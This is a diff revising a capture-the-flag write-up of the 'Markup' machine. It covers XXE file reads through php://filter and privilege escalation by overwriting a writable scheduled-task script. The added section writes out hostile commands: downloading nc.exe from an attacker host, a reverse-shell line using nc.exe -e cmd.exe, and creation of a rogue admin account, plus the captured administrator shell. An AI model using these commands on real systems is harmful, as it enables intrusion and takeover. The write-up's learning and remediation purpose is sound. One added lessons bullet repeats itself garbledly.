@@ -123,9 +123,9 @@ This returned the contents of `win.ini` reflected back inside the application's 
 
 ### 4.4 Reading the application's own source code
 
-Once file read was confirmed, I wanted to understand the application's logic itself, not just guess at file paths. Directly reading `.php` files via `file://` doesn't work well, because the **web server executes PHP files rather than serving their raw text** — so a normal `file://` read would just show you the *output* of the script, or nothing useful, not the source code.
+Once file read was confirmed, I wanted to understand the application's logic itself rather than continue guessing at file paths. Since the XXE primitive lets us make the vulnerable PHP process read files from the filesystem, we can also target the application's own source code.
 
-The fix is PHP's **`php://filter`** wrapper, which can be chained with `convert.base64-encode` to return a file's raw source as base64 text *before* PHP ever executes it:
+PHP's php://filter wrapper allows a stream filter to be applied while a file is being read. By chaining it with convert.base64-encode, we can encode the contents of process.php as Base64 before they are returned through the XXE primitive. Decoding that Base64 locally gives us the application's source code and lets us understand exactly how the XML is being processed.
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -301,9 +301,89 @@ goto theEnd
 echo You must run this script as an Administrator!
 ```
 
-The script's purpose (clearing Windows Event Logs) only makes sense if it's run with administrative rights, and it lives in a custom, non-default directory — both strong signals that it's very likely invoked by a **scheduled task running as SYSTEM**, even though a low-privileged user like `daniel` doesn't have permission to view that task's definition directly (`schtasks /query` at the root folder returned `"no scheduled tasks presently available at your access level"` — a permissions limitation, not proof the task doesn't exist).
+The script is designed to enumerate and clear Windows Event Logs, operations that normally require elevated privileges.
 
-**The underlying technique — writable file + higher-privileged automated execution = privilege escalation** — is a pattern that shows up constantly, in both Windows (scheduled tasks, services with unquoted/writable paths) and Linux (cron jobs, SUID scripts). Because the AutoLogon path had already given me root, I didn't need to weaponize this one for this box, but the identification process is the reusable skill here.
+**The underlying technique — writable file + higher-privileged automated execution = privilege escalation** — is a pattern that shows up constantly, in both Windows (scheduled tasks, services with unquoted/writable paths) and Linux (cron jobs, SUID scripts). Because the AutoLogon path had already given me root, this technique wasn't strictly necessary to finish the box — but I wanted to prove it out fully rather than leave it as a theory, so I came back and weaponized it.
+
+### 5.6 Weaponizing the writable scheduled task
+
+First, I confirmed the permission finding directly with `icacls` rather than taking winPEAS's word for it:
+
+```
+C:\Users\daniel>icacls C:\Log-Management\job.bat
+C:\Log-Management\job.bat BUILTIN\Users:(F)
+                          NT AUTHORITY\SYSTEM:(I)(F)
+                          BUILTIN\Administrators:(I)(F)
+                          BUILTIN\Users:(I)(RX)
+```
+
+The important line is BUILTIN\Users:(F): members of the Users group have Full Control over the script. That means a low-privileged user such as daniel can modify a file that is subsequently executed with higher privileges.
+#### Attempt 1: Creating a new admin user (failed)
+
+My first idea was the simplest possible payload — have the SYSTEM/Administrator-run task create a new local administrator account I could just log into:
+
+```
+echo net user htb-admin Password123! /add > C:\Log-Management\job.bat
+echo net localgroup administrators htb-admin /add >> C:\Log-Management\job.bat
+```
+
+After waiting for the task to fire, I checked:
+
+```
+C:\Users\daniel>net users
+User accounts for \\
+-------------------------------------------------------------------------------
+Administrator            daniel                   DefaultAccount
+Guest                    WDAGUtilityAccount
+The command completed with one or more errors.
+```
+
+`htb-admin` never appeared. 
+The task executed the modified script, but the account was not created. I did not fully root-cause why this particular payload failed, so I don't want to present speculation as fact. Since I already had a working escalation path, I pivoted to a reverse shell instead.
+
+#### Attempt 2: Reverse shell via nc.exe (successful)
+
+I switched to a more direct approach: have the hijacked task spawn a reverse shell back to me instead of trying to persist a new account.
+
+First, I set up a listener and a file server on my attacking machine:
+
+```bash
+cd /usr/share/windows-resources/binaries
+python3 -m http.server 1337
+```
+
+Then downloaded a Windows-compatible `nc.exe` onto the target via `daniel`'s session:
+
+```
+C:\Users\daniel>powershell -c "Invoke-WebRequest -Uri http://10.10.14.49:1337/nc.exe -OutFile nc.exe"
+```
+
+Overwrote the scheduled task's script to launch the reverse shell:
+
+```
+C:\Users\daniel>echo C:\Users\daniel\nc.exe 10.10.14.49 4444 -e cmd.exe > C:\Log-Management\job.bat
+```
+
+And caught the connection:
+
+```bash
+nc -lvnp 4444
+Listening on 0.0.0.0 4444
+Connection received on 10.129.95.192 49808
+Microsoft Windows [Version 10.0.17763.107]
+
+C:\Windows\system32>whoami
+markup\administrator
+```
+
+From there, I confirmed access to the root flag:
+
+```
+C:\>type C:\Users\Administrator\Desktop\root.txt
+[REDACTED]
+```
+
+**A correction I want to flag rather than gloss over:** going into this, I assumed the scheduled task would be running as `NT AUTHORITY\SYSTEM`, since that's the most privileged and most commonly seen context for hidden/background tasks. The actual returned identity was `markup\administrator` — a full local administrator account, but **not** SYSTEM. These aren't the same thing: SYSTEM sits above even Administrator in terms of what it can access (some protected resources are restricted even from Administrator but not from SYSTEM). The outcome here is still a complete compromise — Administrator is more than sufficient to read `root.txt` and fully control the box — but it's a good discipline to verify what a shell actually returns rather than assume your working theory was exactly right. In this case, the task simply runs under the Administrator account itself, which is consistent with the `BUILTIN\Administrators:(I)(F)` and `BUILTIN\Users:(I)(RX)` entries seen in the `icacls` output above.
 
 ---
 
@@ -313,7 +393,7 @@ The script's purpose (clearing Windows Event Logs) only makes sense if it's run 
 |---|---|---|
 | **Weak login credentials** | `admin:password` with no lockout policy | Enforce strong password policy; add account lockout/rate-limiting after failed attempts; consider MFA |
 | **XXE in `process.php`** | `libxml_disable_entity_loader(false)` explicitly enables external entity resolution, combined with `LIBXML_NOENT \| LIBXML_DTDLOAD` | Never disable the entity loader; explicitly disable DTD loading and external entities (`libxml_disable_entity_loader(true)` on older PHP, or simply omit `LIBXML_DTDLOAD`/`LIBXML_NOENT` on modern PHP where external entities are disabled by default); validate/sanitize any XML from untrusted sources; consider a non-DOM parser if raw XML input isn't strictly required |
-| **World-readable SSH private key location** | `id_rsa` accessible to the web server process's file-read scope | Ensure private keys are stored with restrictive filesystem ACLs so the web server account cannot read another user's `.ssh` directory |
+| **SSH private key accessible to the web application** | `id_rsa` accessible to the web server process's file-read scope | Ensure private keys are stored with restrictive filesystem ACLs so the web server account cannot read another user's `.ssh` directory |
 | **Plaintext AutoLogon credentials** | AutoLogon feature stores Administrator password in cleartext in the registry | Disable AutoLogon in production/exposed environments; if required, use a Group Policy-managed alternative or ensure the host is fully network-isolated |
 | **`LocalAccountTokenFilterPolicy` = 1** | Disables UAC remote-restriction protections for local accounts | Set this back to default (`0`) unless there's a specific, documented operational need, since it significantly widens what a compromised local credential can do remotely |
 | **World-writable scheduled task script** | `C:\Log-Management\job.bat`, run with elevated rights, is modifiable by standard users | Apply least-privilege NTFS permissions so only Administrators can modify scripts invoked by privileged scheduled tasks |
@@ -324,9 +404,11 @@ The script's purpose (clearing Windows Event Logs) only makes sense if it's run 
 
 - **Read your error messages.** The very first "failed" XXE payload was actually a success signal — it confirmed entity resolution was happening, even though the output wasn't useful yet. Distinguishing "this technique doesn't work" from "this technique works but I'm using it wrong" is a core debugging skill in this field.
 - **`SYSTEM` and forward-slash URI syntax matter mechanically**, not stylistically — both mistakes silently break the exploit rather than throwing an obviously related error.
-- **`php://filter` is invaluable for reading a target's own source code** through an XXE/LFI primitive, since raw file reads on server-executed script files don't return anything useful.
+- **`php://filter` is invaluable for reading a target's own source code** through an XXE/LFI primitive, php://filter is invaluable for reading an application's PHP source code through an XXE/LFI file-read primitive, because it lets us Base64-encode the source before it is returned.
 - **Privilege escalation is a discovery-then-decision process.** Enumeration (winPEAS) surfaced multiple viable paths; the actual escalation step is often just picking the most direct one available, not necessarily the most "textbook" technique.
 - **Understanding the attacker chain end-to-end is more valuable than memorizing payloads.** Each step here built directly on information gathered in the previous one (comment → username → XXE path guess → source code → key location).
+- **Not every payload works on the first try, and that's normal.** The `net user` account-creation attempt against the hijacked scheduled task didn't persist, for reasons I didn't fully root-cause. Rather than getting stuck debugging it, pivoting to a reverse shell was the more time-efficient move — a real engagement (and a CTF under time pressure) rewards recognizing when to switch approach, not just persistence on one idea.
+- **Verify what a shell actually gives you rather than assuming.** I expected the hijacked task to return a `SYSTEM` shell; it returned `Administrator` instead. Both are complete wins here, but confirming with `whoami` rather than assuming matters — the difference between SYSTEM and Administrator is occasionally significant on other targets, even when it isn't decisive on this one.
 
 ---
 
